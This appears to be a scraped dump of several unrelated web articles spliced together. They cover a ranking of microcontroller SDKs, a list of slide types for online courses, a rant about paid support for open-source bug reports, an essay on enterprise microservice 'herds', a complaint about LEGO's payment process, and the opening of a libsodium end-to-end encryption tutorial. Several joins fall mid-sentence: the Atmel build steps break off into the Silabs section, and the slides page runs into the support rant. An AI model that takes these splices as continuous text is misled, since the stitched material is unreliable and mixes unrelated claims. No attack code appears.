like solid microcontrollers with a broad range of peripherals (including USB).</p>

<h4 id="why-the-rating-1">Why the rating</h4>

<ul>
  <li>Cross-platform ✅</li>
  <li>Supports armcc/Keil, IAR, and Makefiles ✅</li>
  <li>Lots of bundled examples ✅</li>
  <li>Single zip, no install needed ✅</li>
</ul>

<p>Like Nordic, Texas Instruments gets a lot right: single-zip download, multi-IDE
support (including Makefiles), and lots of examples. I knocked off a point for
the wonky <code>exe</code> file (see below) and the more complicated license.</p>

<h4 id="compiling-a-blinky-example-1">Compiling a Blinky example</h4>

<ol>
  <li>Download TiWare SDK from <a href="https://www.ti.com/tool/download/SW-TM4C" target="_blank">SW-TM4C_2.2.0.295, TI.com</a>
</li>
  <li>Rename the downloaded file from <code>exe</code> to <code>zip</code>
</li>
  <li>Unzip it</li>
  <li>
<code>cd</code> to the example you are interested in. In my case <code>examples/boards/dk-tm4c129x/blinky</code>.</li>
  <li>Run <code>make</code>, or open the IDE-specific folder of your choice.</li>
</ol>

<p>You’ll be left with an <code>axf</code> (aka an ELF) and a <code>bin</code>  file in the <code>gcc</code> folder.</p>

<h3 id="nxp-mcuxpresso---910">NXP MCUXpresso - 9/10</h3>

<p><img src="https://interrupt.memfault.com/blog/img/best-and-worst-mcu-sdks/E2992448-AC4D-4A31-9B86-E4806F729E51.png" alt=""></p>

<p>NXP Kinetis traces its lineage to Motorola via Freescale. It is one of two
Cortex-M lines from NXP (the other being the LPC).  Like many MCU vendors, NXP
generates their SDK via a configurator and provides an Eclipse-based IDE, both
under the “MCUXpresso” brand.</p>

<h4 id="why-the-rating-2">Why the rating</h4>

<ul>
  <li>Cross-platform ✅</li>
  <li>Supports armcc/Keil, IAR, and Makefiles ✅</li>
  <li>Lots of bundled examples ✅</li>
  <li>Single zip, no install needed ⚠️</li>
</ul>

<p>I found the online MCUXpresso SDK builder a breeze to use. It is snappy,
straightforward, and it keeps track of all your previously configured SDKs.
Great job, NXP! The only downside of the tool is that it requires you to
register on their website.</p>

<p>I still have a preference for the monolithic SDK with all examples and targets
in one place, but you could argue that this generates a smaller, more
streamlined SDK.</p>

<p>Best of all, the SDK uses <code>cmake</code> to generate build files. <code>cmake</code> is arguably
more portable than <code>make</code>, as it is supported natively on Windows.</p>

<h4 id="compiling-a-hello-world-example">Compiling a hello world example</h4>

<ol>
  <li>Go to the MCUXpresso SDK builder and create an account: <a href="https://mcuxpresso.nxp.com/" target="_blank">MCUXpresso SDK Builder</a>
</li>
  <li>Once logged in, click on “Select Board” in the sidebar</li>
  <li>Enter the name of your MCU. In my case, a Kinetic K21</li>
  <li>Click on “Build MCUXpresso SDK” on the right</li>
  <li>Name your project, select a toolchain, and some third party software like FreeRTOS or mbedTLS.</li>
  <li>Click on “Download SDK” at the bottom</li>
  <li>After a bit, the SDK will be ready for download</li>
  <li>Unzip the SDK</li>
  <li>
<code>cd</code> to the example of your choice, in my case <code>boards/twrk21d50m/demo_apps/hello_world/</code>
</li>
  <li>
<code>cd</code> to build system folder, in my case <code>armgcc</code>
</li>
  <li>Use the <code>build_debug.sh</code> build script and specify the<code>ARMGCC_DIR</code> environment variable:
e.g. <code>ARMGCC_DIR=/usr/local/Cellar/arm-none-eabi-gcc/9-2019-q4-major sh build_debug.sh</code>
</li>
</ol>

<p>This will generate an ELF file.</p>

<h3 id="stm32-cube---810">STM32 Cube - 8/10</h3>

<p><img src="https://interrupt.memfault.com/blog/img/best-and-worst-mcu-sdks/6DA202F6-ED4E-4FFE-94B7-3A549D0F212F.png" alt=""></p>

<p>ST has gone through multiple iterations of the SDK for the STM32 family of ICs.
The latest is called STM32 Cube, which replaces the venerable Standard
Peripheral Library. While Cube introduces a lot of complexity, it does so for a
good reason: the STM32 family has grown to include 14 distinct series of MCUs
from the very low power L0 to the very high-performance H7.</p>

<blockquote>
  <p>Note: Reader Nathan Jones <a href="https://community.memfault.com/t/the-best-and-worst-mcu-sdks-interrupt/294/12" target="_blank">pointed
out</a>
after the initial publication of this post that monolithic SDK downloads do
still exist for STM32. For example, <a href="https://www.st.com/content/st_com/en/products/embedded-software/mcu-mpu-embedded-software/stm32-embedded-software/stm32cube-mcu-mpu-packages/stm32cubef1.html" target="_blank">here is the SDK for the
STM32F1</a></p>
</blockquote>

<h4 id="why-the-rating-3">Why the rating</h4>

<ul>
  <li>Cross-platform ✅</li>
  <li>Supports armcc/Keil, IAR, and Makefiles ✅</li>
  <li>Lots of bundled examples ✅</li>
  <li>Single zip, no install needed ❌</li>
</ul>

<p>While Cube comes with support for many IDEs, and more examples than any other
MCU SDK, it wraps it all in a clunky desktop app. I had a terrible time using
STM32CubeMX: I had to install it on my laptop, it’s slow, it’s large, it’s
clunky. I do not like it.</p>

<p>STM32CubeMX generates a “project” directory based on your configuration. This
means that you won’t have all the example code in one folder, and instead will
need to generate different projects for different examples.</p>

<p>Necessary complexity? Perhaps. But I miss the simpler Peripheral Library which
came as a single archive.</p>

<h4 id="compiling-a-hello-world-example-1">Compiling a Hello World example</h4>

<ol>
  <li>
    <p>Download and install CubeMX: <a href="https://www.st.com/en/development-tools/stm32cubemx.html" target="_blank">STM32CubeMX - STM32Cube initialization code generator - STMicroelectronics</a>. Note: this requires registration on ST’s website</p>
  </li>
  <li>Select “ACCESS TO MCU SELECTOR”</li>
  <li>Select the part you are using. In my case “STM32F429IE”</li>
  <li>In the Configuration view, click on the “Project Manager” tab</li>
  <li>Enter a project name, a path, and select a toolchain. In my case “Makefile”</li>
  <li>Click on “Generate Code” at the top right</li>
  <li>
<code>cd</code> to the generated project directory</li>
  <li>Compile the project with your build system. In my case with <code>make</code>.</li>
</ol>

<h3 id="atmel-start-for-samd---710">Atmel START for SAMD - 7/10</h3>

<p><img src="https://interrupt.memfault.com/blog/img/best-and-worst-mcu-sdks/83E37D9A-5975-4815-8937-437DA8675C0D.png" alt=""></p>

<p>Recently acquired by Microchip, Atmel has been making SAM-family MCUs for a long
time. The SAMD21 is well-liked in hobbyist circles and is featured in several
Arduino and Adafruit designs. Atmel’s peripheral library, AXF, went through a
similar transformation to ST’s: it went from a single zip archive to a
configurator.</p>

<h4 id="why-the-rating-4">Why the rating</h4>

<ul>
  <li>Cross-platform ✅</li>
  <li>Supports armcc/Keil, IAR, and Makefiles ✅</li>
  <li>Lots of bundled examples ✅</li>
  <li>Single zip, no install needed ❌</li>
</ul>

<p>Atmel’s configurator is web-based, and a tad more ergonomic than ST’s. However,
the resulting Makefiles are much worse and even feature a bug (I had to fix OS
detection).</p>

<h4 id="compiling-a-hello-world-example-2">Compiling a hello world example</h4>

<ol>
  <li>Go to start.atmel.com</li>
  <li>Click on “Create New Project”</li>
  <li>Select your MCU. In my case a SAMD51 Chip.</li>
  <li>Click on “Export Project” at the top right</li>
  <li>Give it a name, and tick the check-box for your IDE (for me: Makefile)</li>
  <li>Click on “Download Pack”</li>
  <li>Rename resulting file from <code>.azip</code> to <code>.zip</code>
</li>
  <li>Extract it</li>
  <li>
<code>cd</code> to into IDE folder, in my case <code>gcc</code>
</li>
  <li>Fix Makefile OS detection:

<p>Silabs Cortex-M MCU comes from its acquisition of Energy Micro who was famous for
the very low power consumption of their MCUs. Silabs now makes a range of
Cortex-M based MCUs, some with 2.4GHz radios.</p>

<p>Like many of the vendors in the lower half of this list, Silabs distributes
its SDK alongside an Eclipse-based IDE. In their case, they call it “Simplicity
Studio”. While Simplicity is the best of those IDEs, it does leave those of us
who do not love Eclipse with few solutions. Here, I …</p></div></div>

November 14, 2020 | https://slideslist.com/about | <a href="https://web.archive.org/web/*/https://slideslist.com/about">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                <p>When you search for premium templates for online courses and start looking at the slides, what do you find? </p>

                <p>Fancy graphs. Big numbers. Animations. Stats. World Maps.</p>

                <p>So if you want to create your own online course and teach it using slides, you may think you have to
                    use that.</p>

                  <p>  <strong>Wrong.</strong></p>

                <p>I decided to analyze the best courses and webinars out there from people that are making thousands of dollars, some of them, even millions. I wanted 
                        to understand what type of slides and visuals the top content creators were using.</p>

                <p>I was very surprised after analyzing a couple of them.</p>

                <p>No fancy graphs. No stats, no world maps, no bright and shiny visuals.</p>

                <p>So I checked more. </p>

                <p>I went through 37 top online courses and webinars and... all the slides were fairly simple.</p>

                <p><strong>Here are the 10 types of slides that professional content creators are using for their online
                        courses. And this is all you need to create yours.</strong></p>

                <h3>1. The Main Title</h3>
                <p>This is where you present your course, the title of your lesson, or the main idea for your webinar.
                </p>

                <p><img src="https://d3clwvzq39rwxi.cloudfront.net/cab4dafb-2cb0-482c-b73c-7ca5fd76d81d/images/slidespics/cover.png" alt="cover"></p><h3>2. What are you going to learn slide</h3>

                <p>Here you introduce what's coming. People like to know what to expect from the lesson or for the
                    webinar. Normally 3 main points work best.</p>

                <p><img src="https://d3clwvzq39rwxi.cloudfront.net/cab4dafb-2cb0-482c-b73c-7ca5fd76d81d/images/slidespics/whatyou.png" alt="cover"></p><h3>3. Where are we in the course</h3>

                <p>A reminder of the situation of the student, how far are we within the lesson, within the module, or
                    within the course.</p>

                <p>Similar to the main title, but almost all courses have an alternative way to show another title.</p>

                <p><img src="https://d3clwvzq39rwxi.cloudfront.net/cab4dafb-2cb0-482c-b73c-7ca5fd76d81d/images/slidespics/alttitle.png" alt="cover"></p><h3>The Content</h3>

                <p>There are different ways on how to go about teaching the material, these are the slides used for
                    that:</p>

                <h3>5. A one-line concept</h3>

                <p>Use to explain one concept or idea. You show it on the screen and explain it further talking over it.
                    It goes along with a number generally.</p>


                <p><img src="https://d3clwvzq39rwxi.cloudfront.net/cab4dafb-2cb0-482c-b73c-7ca5fd76d81d/images/slidespics/pilar.png" alt="cover"></p><h3>6. A photo on the left (or right) with a text</h3>

                <p>It could be a photo of a phone or tablet with some freebies you are offering. A photo of a person.
                    Uses go from telling people to wait until the end of the webinar, showing a testimonial, or telling
                    a story.</p>

                <p><img src="https://d3clwvzq39rwxi.cloudfront.net/cab4dafb-2cb0-482c-b73c-7ca5fd76d81d/images/slidespics/leftphoto.png" alt="cover"></p><h3>7. The Big Photo</h3>

                <p>Similar that the previous one. A very common use for this is to show a picture of something
                    funny.</p>
                <p><img src="https://d3clwvzq39rwxi.cloudfront.net/cab4dafb-2cb0-482c-b73c-7ca5fd76d81d/images/slidespics/bigphoto.png" alt="cover"></p><h3>8. Long Text</h3>

                <p>Sometimes you need more text, and this is what this slide is about, to make people read. That's not
                    recommended, but sometimes could be useful.</p>
                <p><img src="https://d3clwvzq39rwxi.cloudfront.net/cab4dafb-2cb0-482c-b73c-7ca5fd76d81d/images/slidespics/titletext.png" alt="cover"></p><h3>9. A quote</h3>


                <p>Almost 100% of the courses I analyzed have quotes.</p>

                <p><img src="https://d3clwvzq39rwxi.cloudfront.net/cab4dafb-2cb0-482c-b73c-7ca5fd76d81d/images/slidespics/quote.png" alt="cover"></p><h3>10. Wrap up</h3>


                <p>A list of the previous one-line concepts into one full slide where you can give a resume of
                    everything you talked about. Very useful to wrap-up your lesson.</p>

                <p><img src="https://d3clwvzq39rwxi.cloudfront.net/cab4dafb-2cb0-482c-b73c-7ca5fd76d81d/images/slidespics/resume.png" alt="cover"></p><p>If you don't want to create them yourself, <a href="https://slideslist.com/">feel free to use all of them</a>, so you can have a starting point to create your online course or

      We need to talk.
    </p><div>

<p>Here’s a paraphrased conversation I’m having way to often, costing me way too much time, keeping me from doing things that are way more important:</p>

<pre>User: Hi, I'd like to report a bug in your application.
Me:   Great! Please open a support ticket, then.
User: But, it looks like I need to pay for that?
Me:   So?
User: I just want to tell you that your app is broken, so you can fix it.
Me:   Yes, that's a support request, please open a ticket.
User: ...
</pre>

  </a>
  
</figure><p>
                             
                             
From there it typically derails into a whiny tirade about me being a crappy two bit developer who doesn’t give a shit about his code (which is ridiculous, since, professional pride aside, I have every incentive to fix bugs, to prevent my inbox from getting flooded) and just wants to rip off his users.</p>

<p>In the past, I sometimes gave in (when it sounded like something might be wrong). I looked at the issue and almost always found that nothing was broken, just didn’t work as expected (which is actually to be expected for every reasonably complex piece of software). The user just didn’t bother reading the docs and tried to bypass the fee by masquerading the support request as a bug report. So, nowadays my policy simply is: no support ticket, no service. Any such request goes straight to the trash folder without even being looked at.</p>

<h2 id="why-am-i-such-an-asshole">Why am I such an asshole?</h2>

<p>Here’s the thing: I write open source software to solve <strong>my problem</strong>. I let you use my solutions because that comes at zero cost for me (well, almost, I still have to pay for the website, you are downloading from. You are welcome, by the way). I also provide the source code, so you can fix things yourself, should my solution turn out to be unsuitable. However, once you come to me with a “bugreport” that doesn’t also include a patch (or at least very precisely pinpoints the problem), then you are basically asking me to <strong>look at your problem</strong>. At this point, it is no longer zero cost for me and that’s the reason for why I am charging you money: you are asking me to spent time on your behalf. That is commonly called <strong>work</strong>. And surprisingly enough, work is what people expect to be paid for.</p>

<p>Don’t get me wrong. I’m happy to help. Selling support is what keeps the lights on here (did I mention the cost of running a webserver?). But coming to me under false pretense and/or expecting that I <strong>must</strong> provide free service on top of a software I gave away without charge is not going to win you any favours.</p>

<p>It stops being free, when it starts costing me! My time is valuable. If you want a piece of it, I want money in return. Period.</p>

<p><strong>UPDATE:</strong> Seems like this post has struck a nerve and caused a few misunderstandings. <a href="https://raccoon.onyxbits.de/blog/reactions-bugreport-free-support/">Clarification on my position here</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<p>I’ve been in big enterprises, as a day job, for almost 6 years now. I’ve also been working on, and growing, a large scale microservice architecture (about 150 microservices) for about 18 months.</p>
<p>In one way microservices give large enterprises the ability to split large work across a variety of teams with isolated codebases. If the published APIs for these microservices don’t change, none of the producers or consumers into that service care about maintenance or features added to that service.</p>
<p>Yet the working of the product as a whole requires all the micoservices to be deployed, with compatible versions, into the deployment environments.</p>
<p>From a high level perspective it doesn’t matter if these services communicate via HTTPS, protobuf, custom TCP protocols, or message buses like Kafka or an MQ flavor. Microservice A still acts on data that’s supposed to be created by Microservice B, and if it’s not there the user’s going to wonder.</p>
<p>If a user posts a photo on a social network type product, and it doesn’t show up after a couple of seconds the user gets worried. If it doesn’t show up ever - because Microservice A posted the photo to some message queue but Microservice B wasn’t deployed to read and respond to the message - that’s actually a bug. As much as a dialog box in the users face would be.</p>
<p>That dependence: Microservice A requires microservice B, which requires microservice C, all deployed for the product <em>and customer’s user journey</em> to work together, is why it’s called a “herd” of microservices. (or a web of microservices, but herd is the more industry-common name).</p>

<p>Enterprise software engineering is waayyy different from startups. Before my time in BigCo land I spent a lot of time in “small projects and startups” land.</p>
<p>I enumerate some of this article’s assumptions here, assuming they are close to universal. My sample size is small, but I don’t think I just got (un) lucky in my experiences:</p>
<ol>
<li>Of &gt; 500 engineers. Some of which work on things totally unknown to you!</li>
<li>codebases owned by teams. (Because in BigCos having a thing owned by a single person makes people antsy, at least in the BigCos I’ve been in. And having a single group of people makes it easy to <em>page them</em>).</li>
<li>Multiple teams per end user project.</li>
<li>The enterprise is now trying to - or successfully have - transitioned to microservices.</li>
<li>Unified discovery or apparent similar route (“oh look the /search api!“. Maybe behind the curtain it’s 5 teams with 20 microservices or lambdas - whatever, the caller doesn’t know or care)</li>
<li>Microservices can be grouped by what downstream or peer services they call or rely on. (The next section will talk about this cluster or “clique” effect)</li>
</ol>
<p>Note: it’s possible - but exceptional - for a microservice to <em>not</em> have an owner. Perhaps the team owning it all got laid off, or all quit before replacements could be hired. From a corporate perspective this is bad - a year or two from now when that microservice breaks, you’ll have a game of hot potato around who needs to fix it… on the double because there’s some customer facing bug. It’s also, very likely, making teams that depend on those microservices nervous, because, “ummm, who <em>is</em> maintaining the Ad Data Repository that we interface with? Ummm…”</p>
<p>Likewise, it’s possible - but should be exceptional - for a microservice to have <em>two</em> owners. In my experience this means you’re either starting to rebuild a monolith, or introducing situations where Team A doesn’t want to deploy but Team B does.</p>

<p>If we consider all the microservices required for a product - or products - to be a herd of microservices you’ll notice something. You’ll notice that these herds form microservice <em>cliques</em> - the login service only talks to the auth database and the email service, but never the file upload service, for example.</p>
<p>Additionally (because this is the enterprise) teams, not individuals, own services. A team may potentially own the majority of services in a clique, or a couple of cliques. If the enterprise is wise there may be some domain drive design modeling going on to better classify these cliques.</p>
<p>I suspect there are three, maybe four, ways to split up the enterprise to serve a product (or multiple products).</p>

<p>Note that the stars in these pictures may be microservices, but could be front end library components.</p>
<h2>Single product, layered approach</h2>

    </span></p>
<p>This organization has teams close to the user, and teams creating services uncoupled from any one product. Imagine the teams working on our social media app, and the a “data platforms” team that handles hard data storage, vendor data imports, or interfaces to the real source of records.</p>
<p>This is very likely Conway’s Law at play: the database team maintains the big database, and (because enterprise) everything currently flows through the big database. This big database is the Source Of Record.</p>
<h3>Another lens</h3>
<p><a href="https://www.amazon.com/Scaling-Teams-Strategies-Successful-Organizations/dp/149195227X/ref=nodl_">Scaling Teams</a> talks about these teams as potentially being part of a platform. Platform in the most generic of words: “the iOS team”, “the web team”, “the android team”. The “APIs” are provided by folks working on “the backend team”.</p>
<p>Yet the diagram still works for this structure of teams. Chapter 7 of <em>Scaling Teams</em> touches on several themes also in this blog entry.</p>
<h2>Many products, layered approach</h2>
<p><span>

  </a>
    </span></p>
<p>Here we have multiple products. Notice that some products aren’t connected to the rest of the herd. Product B is somewhat connected: think how Instagram uses Facebook for authorization, but that’s it.</p>
<h2>Cross functional teams</h2>
<p>Cross functional teams aren’t super new - I heard about them when I was in Total Quality Management classes in college.</p>
<p><span>
      <a href="https://blog.wilcoxd.com/static/7f84f9cd965c4d23f80eff6d50ea3e1b/636d3/cross-functional-teams.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="full stack" title="full stack" src="https://blog.wilcoxd.com/static/7f84f9cd965c4d23f80eff6d50ea3e1b/fcda8/cross-functional-teams.png" srcset="https://blog.wilcoxd.com/static/7f84f9cd965c4d23f80eff6d50ea3e1b/12f09/cross-functional-teams.png 148w,

  </a>
    </span></p>
<p>But the idea here is that a “two pizza team” should be empowered to change everything about some sliver of functionality from the UI all the way down the stack. Because - an often quoted definition - an agile feature isn’t shipped until a user <em>sees</em> it.</p>
<p>I would also posit that these cross-functional teams don’t break Conway’s Law, but may graft a cross-functional layer on top of the existing org structure.</p>
<p>Likewise, I suspect this approach means you have an implicit layered model too. Perhaps you have services created using the <a href="https://docs.microsoft.com/en-us/azure/architecture/patterns/backends-for-frontends">Backend For Frontend</a> design pattern. Our example social media enterprise might have a BFF microservice that supplies data for the mobile app, and a “data layer” service… which a BFF microservice for the Alexa app uses. I attempt to illustrate that in the diagram, in fact.</p>
<p>I’m not convinced GraphQL solves this problem either - you may have queries and mutations used heavily by some other team too.</p>

<p>Regardless of how your org chart really looks, if - and since - teams are coupled to microservices you can either make your system design look like your org chart <em>or</em> facade over that org chart. Either way you can draw a box around microservice owners and (hopefully!) find edges of parts of your business domain. Or, if that doesn’t work, find the cliques and draw boxes around <em>them</em>.</p>
<h2>on data, technical debt as a metaphor, and other cross cutting concerns</h2>
<p>Take a look back at those diagrams. Notice the different database organizations of the various structures. A layered organization will likely have <em>only</em> one or two databases controlled by the product teams (for “closeness of data” or “only <em>we</em> care about this particular part of the data”) where the teams downstream are the “source of record”.</p>
<p>In a fully cross-functional example there <em>is</em> no “downstream”. Yet the organization still has data to store, maintain and guard. Teams may create a database or two, or one per microservice, to store this data. Yet I would argue that “data standards” is an enterprise wide concern. Is the data secured in transmit and rest, potentially using approved data storage tech, with proper access rights? No enterprise wants a privacy leak and lawsuit like Target or Equifax.</p>
<p>So, how does an enterprise, or a group of teams working on a single product inside the enterprise, establish data standards?</p>
<p>Likewise, how does “technical debt” - perhaps “oh yeah we should secure this database, it’s some technical debt we need to clean up” of a microservice, of a clique, affect the herd? Or the product? Or the business?</p>
<p>In fact, I’m starting to dislike the analogy of technical debt, and starting to lean into the idea of the <a href="https://twitter.com/jessitron/status/1314311394406346752?s=21">functional capability</a> of a system.</p>
<p>In the US there’s often both bad roads and lots of road construction, so the model of functional capacity of a system being <strong>a road to deliver the customer journey</strong> feels natural to me.</p>
<p>If our journey is to drive features to the customer, then we want well paved roads so we can drive quickly, not dirt roads where 35MPH is all you can go. We also want certain, built in, abilities of the road: smooth ride, experts on call in case we break a tire (or a database!), and potentially some kind of guidance to ensure our car is safe to use on the road and not harming others or the environment (like spewing customer data everywhere).</p>
<p>This is the topic of a future blog post: roads and feature capacity of microservice herds. Which will be a much easier conversation to have now that we understand microservices, cliques, herds, products, teams, and how enterprises mash those concepts up in different ways.</p></section></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><h2 id="because-they-probably-wont">…because they probably won’t</h2><p>I recently watched a few videos on YouTube about the latest and greatest LEGO sets. I didn’t do it because I’m super interested in LEGO (that was a while ago) but because the YouTube algorithm decided that I had to. I naturally obeyed. The results were as expected: I felt old and none of those sets triggered any kind of “I need to have this” response. Until I saw this:</p><p><img src="https://www.krewast.de/img/artikel-lego-tree-house.jpg" alt="Lego Tree House"></p><p>This beautiful tree house immediately sparked my interest. It’s cute, it’s not one of those boring license sets (Star Wars, Harry Potter, Minecraft, …), the price to number of LEGO pieces ratio is okay (still super expensive!) and it would fit nicely between my house plants which I foster - and sometimes kill - in my living room.</p><p>So, I did something I usually never do: I made an impulse buy. I put the 195&nbsp;€ tree house into the shopping cart, created a LEGO user account, entered all my data, chose “Invoice” as payment method and clicked “Buy”. I received the automatic “Thank you for your purchase” e-mail and felt happy.</p><h2 id="we-are-sorry">We are sorry</h2><p>On the next day I received another e-mail. This time from the LEGO customer service. You can find the original German version at the end of this post, here is a short translation of the important part:</p><blockquote>Dear Bastian Kres,<p>thank you for ordering your LEGO® toy directly from us.</p><p>Unfortunately, the total amount of your order exceeds the credit limit for payment on account and by direct debit. Therefore, we are not able to send this order yet.</p><p>Please call us to pay by VISA or MasterCard. […]</p></blockquote><p>Well, here’s the thing: LEGO knew that I was a first time customer and they also knew that the total amount of my order was about 195 €. If they didn’t want me to pay on account, why did they offer me the option?</p><h2 id="how-to-kill-enthusiasm">How to kill enthusiasm</h2><p>1.) I would like to mention that wouldn’t have had a problem to pay in advance. PayPal or credit card are good options which I use all the time. But by sending me this e-mail after I already selected my preferred payment method and ordered the thing, LEGO basically tells me that I cannot be trusted. And at the same time they want me to trust them…</p><p>2.) As I wrote before, this purchase was an impulse buy. The tree house is something I wanted. But after receiving this e-mail I had lot of time to think about whether or not I still do? Especially because I could buy a huge amount of real plants for 195&nbsp;€. That would be good for nature, but bad for LEGO.</p><p>3.) By postponing the delivery until after I paid, they also created a whole new experience for me. Now I don’t have the tree house in my hands, see how nice it is and pay happily. No, now I have this bitter taste in my mouth and a decision to make. Should I really be making decisions after I already ordered something?</p><h2 id="some-lessons-for-online-stores">Some lessons for online stores</h2><p>As a web developer I always find it interesting to see how even very big companies still make mistakes like this. But the good thing is: We can learn from them!</p><ul><li>Make it easy for customers to order from you, avoid any friction or inconveniences</li><li>Offer customers a broad set of payment options, omit those you deem too risky</li><li>Don’t send customers “We don’t trust you” messages after they already ordered something from you. It totally kills their enthusiasm</li></ul><p>And that’s it.</p><p>One last question remains: Did LEGO dodge a bullet because I would have sent the tree house back anyway? Maybe, but probably not. I rarely send anything back for two reasons: It’s an effort and I’m generally lazy ;)</p><p>If any of this sound snarky: I’m sorry, that was never my intention. I just found it interesting (and wanted to share) how LEGO decided to set up this process, what consequences it can have and how I probably won’t get a new toy but at least ten new house plants.</p><hr><p>Obligatory link to <a href="https://www.youtube.com/channel/UC_EZd3lsmxudu3IQzpTzOgw" target="_blank" rel="nofollow noopener">Held der Steine</a> and his <a href="https://www.youtube.com/watch?v=nIQJV2o6EPY" target="_blank" rel="nofollow noopener">LEGO Tree House</a> video.</p><h2 id="the-original-german-e-mail">The original German e-mail</h2><blockquote>Guten Tag Bastian Kres,<p>vielen Dank, dass Sie Ihr LEGO® Spielzeug direkt bei uns bestellt haben.</p><p>Leider überschreitet die Gesamtsumme Ihrer Bestellung die Kreditgrenze für Zahlung auf Rechnung und per Lastschriftverfahren.

		<div>

			
<p>Governments are back on their anti-encryption bullshit again.</p>



<p>Between the <a href="https://blog.cryptographyengineering.com/2020/03/06/earn-it-is-an-attack-on-encryption/">U.S. Senate’s “EARN IT” Act</a>, the <a href="https://www.eff.org/deeplinks/2020/10/orders-top-eus-timetable-dismantling-end-end-encryption">E.U.’s slew of anti-encryption proposals</a>, and <a href="https://fee.org/articles/australia-s-unprecedented-encryption-law-is-a-threat-to-global-privacy/">Australia’s new anti-encryption law</a>, it’s become clear that the authoritarians in office view online privacy as a threat to their existence.</p>



<p>Normally, when the governments increase their anti-privacy sabre-rattling, technologists start talking more loudly about Tor, Signal, and other privacy technologies (usually only to be drowned out by paranoid people who think Tor and Signal are government backdoors or something stupid; conspiracy theories ruin everything!).</p>



<p><strong>I’m not going to do that.</strong></p>



<p>Instead, I’m going to show you how to add end-to-end encryption to any communication software you’re developing. (Hopefully, I’ll avoid making <a href="https://soatok.blog/2020/10/28/bizarre-design-choices-in-zooms-end-to-end-encryption/">any bizarre design decisions</a> along the way.)</p>



<p>But first, some important disclaimers:</p>



<ol><li><strong>Yes, you should absolutely do this.</strong> I don’t care how banal your thing is; if you expect people to use it to communicate with each other, you should make it so that you can never decrypt their communications.</li><li>You should absolutely NOT bill the thing you’re developing as an <em>alternative</em> to Signal or WhatsApp.</li><li>The goal of doing this is to increase the amount of end-to-end encryption deployed on the Internet that the service operator cannot decrypt (even if compelled by court order) and make E2EE normalized. The goal is NOT to compete with highly specialized and peer-reviewed privacy technology.</li><li>I am not a lawyer, I’m some furry who works in cryptography. The contents of this blog post is not legal advice, nor is it endorsed by any company or organization. Ask the <a href="https://eff.org/">EFF</a> for legal questions.</li></ol>



<p>The organization of this blog post is as follows: First, I’ll explain <a href="#symmetric-key-encryption">how to encrypt and decrypt data between users</a>, assuming you have a key. Next, I’ll explain <a href="#key-agreement">how to build an authenticated key exchange</a> and <a href="#session-key-management">a ratcheting protocol to determine the keys used in the first step</a>. Afterwards, I’ll explore <a href="#identity-key-management">techniques for binding authentication keys to identities and managing trust</a>. Finally, I’ll discuss <a href="#backdoor-resistance">strategies for making it impractical to ever backdoor your software (and impossible to silently backdoor it)</a>, just to piss <a href="https://en.wikipedia.org/wiki/Five_Eyes">the creeps and tyrants of the world</a> off even more.</p>



<p>You don’t have to implement the full stack of solutions to protect users, but the further you can afford to go, the safer your users will be from privacy-invasive policing.</p>







<h2 id="preliminaries">Preliminaries</h2>



<h3 id="choosing-a-cryptography-library">Choosing a Cryptography Library</h3>



<p>In the examples contained on this page, I will be using the <a href="https://libsodium.gitbook.io/doc/">Sodium cryptography library</a>. Specifically, my example code will be written with the <a href="https://github.com/paragonie/sodium-plus">Sodium-Plus</a> library for JavaScript, since it strikes a good balance between performance and being cross-platform.</p>



<pre><code>const { SodiumPlus } = require('sodium-plus');

(async function() {
     // Select a backend automatically
     const sodium = await SodiumPlus.auto();
     
     // Do other stuff here
})();</code></pre>



<p>Libsodium is <a href="https://latacora.micro.blog/2018/04/03/cryptographic-right-answers.html">generally the correct choice for developing cryptography features in software</a>, and is available in most programming languages,</p>



<p>If you’re prone to choose a different library, you should consult your cryptographer (and yes, you should have one on your payroll if you’re doing things different) about your design choices.</p>



<h3>Threat Modelling</h3>



<p>Remember above when I said, “You don’t have to implement the full stack of solutions to protect users, but the further you can afford to go, the safer your users will be from privacy-invasive policing”?</p>



<p>How far you go in implementing the steps outlined on this blog post should be informed by <a href="https://adamcaudill.com/2016/07/20/threat-modeling-for-applications/">a threat model</a>, not an ad hoc judgment.</p>



<p>For example, if you’re encrypting user data and storing it in the cloud, you probably want to pass <a href="https://blog.cryptographyengineering.com/2012/04/05/icloud-who-holds-key/">the Mud Puddle Test</a>:</p>



<blockquote><div><p>1. First, drop your device(s) in a mud puddle.<br>2. Next, slip in said puddle and crack yourself on the head. When you regain consciousness you’ll be perfectly fine, but<em>&nbsp;won’t for the life of you&nbsp;</em>be able to&nbsp;recall your device passwords or keys.<br>3. Now try to get your cloud data back.</p><p>Did you succeed? If so, you’re screwed. Or to be a bit less dramatic, I should say: your cloud provider has access to your ‘encrypted’ data, as does the government if they want it, as does any rogue employee who knows their way around your provider’s internal policy checks.</p></div><cite>Matthew Green describes the Mud Puddle Test, which Apple products <a href="https://sneak.berlin/20201112/your-computer-isnt-yours/">definitely don’t pass</a>.</cite></blockquote>



<p>If you must fail the Mud Puddle Test for your users, make sure you’re clear and transparent about this in the documentation for your product or service.</p>







<h2 id="symmetric-key-encryption">I. Symmetric-Key Encryption</h2>



<p>The easiest piece of this puzzle is to encrypt data in transit between both ends (thus, satisfying the loosest definition of end-to-end encryption).</p>



<p>At this layer, you already have some kind of symmetric key to use for encrypting data before you send it, and for decrypting it as you receive it.</p>



<p>For example, the following code will encrypt/decrypt strings and return hexadecimal strings with a version prefix.</p>


<pre title="">const VERSION = "v1";

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function encryptData(message, key, assocData = null) {
    const nonce = await sodium.randombytes_buf(24);
    const aad = JSON.stringify({
      'version': VERSION,
      'nonce': await sodium.sodium_bin2hex(nonce),
      'extra': assocData
    });

    const encrypted = await sodium.crypto_aead_xchacha20poly1305_encrypt(
        message,
        nonce,
        key,
        aad
    );
    return (
       VERSION +
       await sodium.sodium_bin2hex(nonce) +
       await sodium.sodium_bin2hex(encrypted)
    );
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function decryptData(encrypted, key, assocData = null) {
    const ver = encrypted.slice(0, 2);
    if (!await sodium.sodium_memcmp(ver, VERSION)) {
        throw new Error("Incorrect version: " + ver);
    }
